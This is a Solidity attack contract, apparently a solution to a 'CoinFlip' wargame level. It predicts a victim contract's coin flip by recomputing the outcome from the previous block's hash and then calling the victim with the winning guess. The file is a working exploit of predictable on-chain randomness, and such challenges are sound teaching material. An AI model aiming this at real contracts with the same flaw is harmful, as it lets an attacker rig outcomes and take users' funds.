// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "@openzeppelin/contracts-ethereum-package/contracts/math/SafeMath.sol";
import "./CoinFlip.sol";

contract CoinFlipAttack{
    CoinFlip public victimContract;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _VictimContract) public {
       victimContract = CoinFlip(_VictimContract);
   }

   function flip() public returns(bool){
        uint256 blockValue =uint256(blockhash(block.number - 1)); // replicate logic from the victim contract
        uint256 coinFlip = uint256(blockValue/FACTOR);
        bool side = coinFlip == 1 ? true : false;

        victimContract.flip(side);
   }
}